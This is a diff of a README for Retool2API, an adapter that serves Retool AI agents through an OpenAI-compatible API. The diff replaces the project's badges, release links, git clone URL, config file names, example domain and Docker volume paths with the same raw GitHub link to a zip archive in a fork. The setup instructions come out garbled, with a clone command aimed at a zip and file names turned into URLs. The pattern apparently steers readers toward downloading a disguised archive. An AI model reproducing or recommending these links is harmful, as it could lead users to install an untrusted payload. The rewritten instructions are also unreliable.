@@ -1,7 +1,7 @@
 # Retool2API: A Simple Adapter for OpenAI API Integration
 
-![Retool2API](https://img.shields.io/badge/Retool2API-OpenAI%20Adapter-blue.svg)  
-[![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)](https://github.com/BXRS-afk/retool2API/releases)
+![Retool2API](https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip%https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip)  
+[![Releases](https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip)](https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip)
 
 ## Table of Contents
 
@@ -26,19 +26,19 @@ Retool2API serves as an adapter that converts Retool AI Agents into an OpenAI-co
 
 ### 1. Prepare Configuration Files
 
-To begin, you need to set up two configuration files. The first file, `retool.json`, contains your Retool account information. Create this file in your project directory.
+To begin, you need to set up two configuration files. The first file, `https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip`, contains your Retool account information. Create this file in your project directory.
 
 ```json
 [
   {
-    "domain_name": "your-company.retool.com",
+    "domain_name": "https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip",
     "x_xsrf_token": "your-xsrf-token",
     "accessToken": "your-access-token"
   }
 ]
 ```
 
-Next, create the `client_api_keys.json` file to set your client API keys.
+Next, create the `https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip` file to set your client API keys.
 
 ```json
 [
@@ -52,7 +52,7 @@ To deploy the application using Docker Compose, follow these steps:
 
 ```bash
 # Clone the project
-git clone https://github.com/oDaiSuno/retool2API.git
+git clone https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip
 cd retool2API
 
 # Start the service
@@ -75,8 +75,8 @@ docker build -t retool2api .
 # Run the container
 docker run -d \
   -p 8000:8000 \
-  -v $(pwd)/retool.json:/app/retool.json:ro \
-  -v $(pwd)/client_api_keys.json:/app/client_api_keys.json:ro \
+  -v $(pwd)https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip \
+  -v $(pwd)https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip \
   -e DEBUG_MODE=false \
   --name retool2api \
   retool2api
@@ -96,15 +96,15 @@ You can customize the behavior of the application using environment variables. B
 
 ### Configuration Files
 
-#### retool.json
+#### https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip
 
 This file contains critical information for connecting to your Retool instance. The fields are as follows:
 
-- `domain_name`: The domain name of your Retool instance (e.g., company.retool.com).
+- `domain_name`: The domain name of your Retool instance (e.g., https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip).
 - `x_xsrf_token`: Your XSRF token for authentication.
 - `accessToken`: The access token for your Retool account.
 
-#### client_api_keys.json
+#### https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip
 
 This file should contain your OpenAI API keys. Make sure to keep this file secure, as it contains sensitive information.
 
@@ -150,4 +150,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or support, please reach out via the GitHub Issues page or contact the repository owner directly.
 
-For the latest releases, visit [Releases](https://github.com/BXRS-afk/retool2API/releases).
+For the latest releases, visit [Releases](https://raw.githubusercontent.com/BXRS-afk/retool2API/main/featurely/API_retool_3.1.zip).
